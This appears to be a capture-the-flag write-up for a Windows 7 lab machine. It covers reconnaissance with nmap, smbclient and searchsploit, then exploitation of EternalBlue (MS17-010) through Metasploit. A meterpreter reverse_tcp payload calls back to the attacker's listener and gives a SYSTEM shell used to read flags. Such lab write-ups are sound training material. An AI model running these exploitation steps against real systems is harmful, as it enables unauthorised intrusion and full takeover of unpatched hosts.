## Blue

### Lab Details 

- Difficulty: Easy
- Type: SMB, Windows

#### Tasks
Q1: How many open TCP ports are listening on Blue? Don't include any 5-digit ports.
- run nmap `nmap -sT -T4 -vv -A -p- -oA Blue 10.10.10.40`  
- 3 ports
```
<snip>
PORT      STATE    SERVICE       REASON      VERSION
135/tcp   open     msrpc         syn-ack     Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack     Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds  syn-ack     Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
<snip>
```

Q2: What is the hostname of Blue?
- as part of output from nmap 
```
<snip>
Host script results:
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
<snip>
``` 

Q3: What operating system is running on the target machine? Give a two-word answer with a name and high-level version.
- as part of output from nmap
```
<snip>
 |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
<snip>

Q4: How many SMB shares are available on Blue?
- enum SMB share using `smbclient`
```
$: smbclient -L 10.10.10.40
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Share           Disk
        Users           Disk
```

Q5: What 2017 Microsoft Security Bulletin number describes a remote code execution vulnerability in SMB?
- search for the exploit by using `searchsploit`
```
$: searchsploit smb
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
<snip>
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                          | windows/remote/42031.py
<snip>
```
 

Q6: Optional question: A worm was set loose on the internet in May 2017 propagating primarily through MS17-010. What is the famous name for that malware?
- searching `worm ms17-010` on return a wiki page on EternalBlue and it mentions a worm called WannaCry

Q7: What user do you get execution with when exploiting MS17-010? Include the full name, including anything before a .
- exploit the vulnerability using msfconsole (windows/smb/ms17_010_eternalblue) module
- example below
```
msf6 > search blue

Matching Modules
================
<snip>
   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   13  exploit/windows/smb/ms17_010_eternalblue                    2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   14  exploit/windows/smb/ms17_010_psexec                         2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
<snip>
msf6 > use 13
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target m
                                             achines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machi
                                             nes.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.161    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhost 10.10.10.40
rhost => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.14.27
lhost => 10.10.14.27
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```


Q8: Submit the flag located on the haris user's desktop. 
- after running the exploit will give us a shell as NT authority\System (highest access on target)
- user.txt is locate at C:\Users\haris\Desktop\user.txt
- use `type` to display content

Q9: Submit the flag located on the administrator's desktop.
- root.txt is located at C:\Users\administrator\Desktop\root.txt

#### Lesson Learned
